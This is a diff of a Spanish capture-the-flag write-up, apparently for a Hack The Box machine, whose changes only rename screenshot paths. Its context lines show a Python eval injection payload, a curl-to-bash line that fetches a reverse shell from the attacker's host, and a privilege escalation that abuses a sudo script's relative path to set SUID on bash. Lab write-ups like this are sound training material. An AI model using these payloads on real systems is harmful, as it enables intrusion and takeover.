@@ -250,7 +250,7 @@ Para realizar la explotación manual, interceptaremos con `BurpSuite` la solicit
 ' + __import__('os').popen('id').read() + '
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 El siguiente paso, será lograr obtener una Reverse Shell. Para ello, crearemos en nuestro equipo un archivo llamado `shell.sh` que contiene la Reverse Shell, compartiremos el script a través de un servidor web.
 
@@ -277,7 +277,7 @@ Realizaremos la siguiente inyección de comando para que realize la petición co
 ' + __import__('os').popen('curl http://10.10.16.7/shell.sh|bash').read() + '
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos que finalmente ganamos acceso al sistema con el usuario`svc` y logramos comprobar la flag de **user.txt**.
 
@@ -457,15 +457,15 @@ Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 Accederemos a [http://gitea.searcher.htb](http://gitea.searcher.htb) y probaremos de acceder con las credenciales del usuario `cody` localizadas anteriormente.
 
-<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Enumerando el `Gitea`, logramos encontrar un repositorio propio de nuestro usuario.
 
-<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Revisamos el repositorio que disponemos, y comprobamos que se trata del archivo de `Searchor`, la página web desde la cual obtuvimos el acceso inicial al sistema.
 
-<figure><img src="../../.gitbook/assets/imagen (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing sudoers privilege + Information Leakage in Docker Containers
 
@@ -810,25 +810,25 @@ mysql> SELECT * FROM user;
 
 Volvimos a nuestro equipo local donde tenemos acceso al `Gitea` mediante **Port Forwarding**. Probamos de acceder con las credenciales del usuario `Administrator` localizadas en el punto anterior y comprobamos del acceso correspondiente. También, logramos verificar que disponíamos de un repositorio llamado `scripts`.&#x20;
 
-<figure><img src="../../.gitbook/assets/imagen (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al acceder al repositorio de `scripts`, logramos visualizar diferentes archivos/scripts que parecen ser los que se encontraban en `/opt/scripts` que inicialmente no podíamos visualizar su contenido.
 
 El primer script que logramos visualizar es el de `check-ports.py` el cual después de revisarlo, no logramos sacar nada relevante.
 
-<figure><img src="../../.gitbook/assets/imagen (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 A continuación, se muestra el contenido de `full-checkup.sh`.
 
-<figure><img src="../../.gitbook/assets/imagen (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Contenido del script `install-flask.sh`
 
-<figure><img src="../../.gitbook/assets/imagen (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Contenido del script `system-checkup.py`.
 
-<figure><img src="../../.gitbook/assets/imagen (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Relative Path Exploitation in Script
 
@@ -836,7 +836,7 @@ Después de una revisión exhaustiva de los scripts encontrados, nos encontramos
 
 En el archivo del script, se mencionaba la función `full-checkup` en la cual probaba de ejecutar un script llamado `full-checkup.sh`. De la manera que está representado este valor, no se le indica la ruta absoluta del archivo de Bash, con lo cual nos puede permitir crear un archivo con el mismo nombre que realice otra acción que deseemos. Recordemos que este script lo ejecutamos como usuario `sudo`, con lo cual podríamos llegar a modificar archivos, etc para lograr acceso al sistema.
 
-<figure><img src="../../.gitbook/assets/imagen (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Por lo tanto, decidimos de crear un archivo llamado `full-checkup.sh` que lo que realizaría es otorgar al binario `/bin/bash` permisos de `SUID`.
 
